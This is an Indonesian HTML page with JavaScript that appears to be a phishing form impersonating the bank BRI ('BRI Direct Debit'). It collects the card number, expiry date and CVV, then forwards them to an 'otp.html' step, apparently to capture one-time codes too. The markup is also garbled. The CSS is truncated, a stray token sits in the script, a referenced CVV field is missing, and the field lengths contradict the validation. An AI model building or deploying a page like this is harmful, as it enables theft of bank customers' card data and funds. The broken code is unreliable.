<!DOCTYPE html><html lang="id"><head>

 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">

  <style>
    body {

    .form-group {

  flex-direction: column; /* ubah dari row ke kolom */
  align-items: flex-start; /* rata kiri */

input[type="tel"] {

    button {

    .card-box {
  width: 300px;

  perspective: 1000px;

  border: 1px solid #0F78CB; /* garis pembatas */

nav {
            width: 100%;
            position: fixed;

border: 2px solid #ffffff;

</head>
<body>
    

<div class="card-box">
  <div class="card" id="card">
    <div class="front">
      <div class="card-number" id="displayCardNumber">•••• •••• •••• ••••</div>
      <div class="card-expiry">Valid Thru: <span id="displayExpiry">00/00</span></div>
    </div>
    <div class="back">
      <div>CVV</div>
      <div class="card-cvv" id="displayCVV">•••</div>
    </div>
  </div>
</div>
<br><br>
<div class="card-type" id="cardType"></div>

<form id="cardForm" action="otp.html" method="POST" onsubmit="return validateForm()">
  <div class="form-wrapper">
     <label for="" class="ml-3" style="color:#0f52b0;">ɴᴏᴍᴏʀ ᴋᴀʀᴛᴜ</label>
  <div class="form-group">
    <input type="tel" name="cardNumber" id="cardNumber" minlength="4" maxlength="4" style="padding-left: 12px;" placeholder="𝟒 𝐃𝐈𝐆𝐈𝐓 𝐓𝐄𝐑𝐀𝐊𝐇𝐈𝐑 𝐊𝐀𝐑𝐓𝐔">
    <div class="error" id="cardError"></div>
  </div>
    <label for="" class="ml-3" style="color:#0f52b0;">ᴍᴀꜱᴀ ʙᴇʀʟᴀᴋᴜ (ᴠᴀʟɪᴅ ᴛʜʀᴜ)</label>
  <div class="form-group">
    <input type="tel" name="expiry" id="expiry" maxlength="5" placeholder="𝐌𝐌/𝐘𝐘">
    <div class="error" id="expiryError"></div>
  </div>

  <div style="text-align:center">
  <button type="submit" =disabled="">Lanjutkan</button>
  </div>


<script>
function detectCardType(number) {
  number = number.replace(/\s/g, '');
  if (/^4/.test(number)) return 'Visa';
  if (/^5[1-5]/.test(number) || /^2(2[2-9]|[3-6]|7[01])/.test(number)) return 'MasterCard';
  if (/^3[47]/.test(number)) return 'AMEX';
  return 'Tidak Dikenal';
}

function validLuhn(number) {
  number = number.replace(/\D/g, '');
  let sum = 0, toggle = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = +number[i];
    if (toggle) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    toggle = !toggle;
  }
  return sum % 10 === 0;
}

function validExpiry(value) {
  if (!/^\d{2}\/\d{2}$/.test(value)) return false;
  const [month, year] = value.split('/').map(Number);
  if (month < 1 || month > 12) return false;
  const now = new Date();
  const expiry = new Date(2000 + year, month);
  return expiry > now;
}

function validCVV(cvv, cardType) {
  if (cardType === 'AMEX') return /^\d{4}$/.test(cvv);
  return /^\d{3}$/.test(cvv);
}

document.getElementById('cardNumber').addEventListener('input', function () {
  let value = this.value.replace(/\D/g, '').substring(0, 16);
  this.value = value.replace(/(.{4})/g, '$1 ').trim();
  document.getElementById('displayCardNumber').textContent = this.value || '•••• •••• •••• ••••';
  const type = detectCardType(this.value);
  document.getElementById('cardType').textContent = type === 'Tidak Dikenal' ? '𝗕𝗥𝗜 𝗗𝗶𝗿𝗲𝗰𝘁 𝗗𝗲𝗯𝗶𝘁' : type;
});

document.getElementById('expiry').addEventListener('input', function () {
  let value = this.value.replace(/\D/g, '').substring(0, 4);
  if (value.length >= 3) {
    this.value = value.substring(0, 2) + '/' + value.substring(2);
  } else {
    this.value = value;
  }
  document.getElementById('displayExpiry').textContent = this.value || 'MM/YY';
});

document.getElementById('cvv').addEventListener('focus', () => document.getElementById('card').classList.add('flipped'));
document.getElementById('cvv').addEventListener('blur', () => document.getElementById('card').classList.remove('flipped'));
document.getElementById('cvv').addEventListener('input', function () {
  document.getElementById('displayCVV').textContent = this.value || '•••';
});

function validateForm() {
  const cardNum = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
  const expiry = document.getElementById('expiry').value.trim();
  const cvv = document.getElementById('cvv').value.trim();kir
  const type = detectCardType(cardNum);

  document.getElementById('cardError').textContent = '';
  document.getElementById('expiryError').textContent = '';
  document.getElementById('cvvError').textContent = '';

  let valid = true;

  if (cardNum.length !== 16 || !validLuhn(cardNum)) {
    document.getElementById('cardError').textContent = 'Nomor tidak valid';
    valid = false;
  }

  if (!validExpiry(expiry)) {
    document.getElementById('expiryError').textContent = 'Tanggal salah';
    valid = false;
  }

  if (!validCVV(cvv, type)) {
    document.getElementById('cvvError').textContent = 'CVV salah';
    valid = false;
  }

  return valid;
}

</script>

</div></form></body></html>
